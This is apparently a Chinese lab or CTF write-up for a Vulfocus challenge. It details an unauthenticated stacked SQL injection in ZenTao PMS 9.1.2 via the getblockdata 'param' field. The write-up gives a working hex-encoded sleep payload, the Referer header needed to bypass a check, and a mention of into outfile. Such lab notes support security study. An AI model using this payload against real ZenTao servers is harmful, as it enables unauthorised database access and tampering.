# 247｜禅道 9.1.2 block getblockdata SQL 注入（无 CVE）

- 镜像：`vulfocus/zentaopms_9.1.2_sql`
- 题库端口：`80,3306`。注入走 HTTP **80**。
- 题库无 CVE。检索未找到对应 CNVD/CVE。**不要用 CNVD-2022-42853**（16.5 `user-login.html` 的 `account=`）。公开 8.2–9.2.1 / 9.1.2 题解是未授权 **`orderBy`/`limit` 堆叠注入**。[S1][S2]

## 一句话打法

未授权 GET `block/main` `getblockdata`，把含 `order limit …;` 的 JSON 做 Base64 放进 `param`；`limit` 在 `dao.class.php` 无过滤拼接。[S1]

## 操作步骤

1. 入口：`/zentaopms/www/index.php` 或 PATH_INFO `block-main.html`。版本探测：`index.php?mode=getconfig` → 9.1.2。[S4]
2. `m=block&f=main&mode=getblockdata&blockid=case&param=<base64 json>`。JSON 需 `"type":"openedbyme"`、`"num":"1,1"`、`"orderBy":"order limit …"`。[S1]
3. 公开示例：睡眠/十六进制堆叠（避开 `orderBy` 对 `_` 的过滤）：[S4]

   ```
   {"orderBy":"order limit 1;SET @SQL=0x73656c65637420736c656570283529;PREPARE pord FROM @SQL;EXECUTE pord;-- -","num":"1,1","type":"openedbyme"}
   ```

   **必须**带 `Referer: http://<host>/zentaopms/`（或真实站点根），否则 constructor `die`。[S2]
4. 成功信号：sleep 延迟。`into outfile` 依赖 FILE 权限，不保证。[S1]

## 本题特有排坑

- Referer 必须以站点 URL 开头。[S2]
- 参数名是 **`param`**，不是 `account`。[S1]
- `orderBy` 会剥 `_`，所以用 `SET @SQL=0x…`。[S4]
- 前台开放方法，不是登录框注入。[S1]

## 来源

- [S1] 安恒/安骑士：orderBy 堆叠、outfile 例。详见[来源清单](../sources/247_zentaopms-9.1.2-sql/_meta.md)。
- [S2] 博客园：Referer、 pentest 细节。详见[来源清单](../sources/247_zentaopms-9.1.2-sql/_meta.md)。
- [S3] Docker Hub。详见[来源清单](../sources/247_zentaopms-9.1.2-sql/_meta.md)。
- [S4] Vulfocus 题名复述：hex sleep。详见[来源清单](../sources/247_zentaopms-9.1.2-sql/_meta.md)。
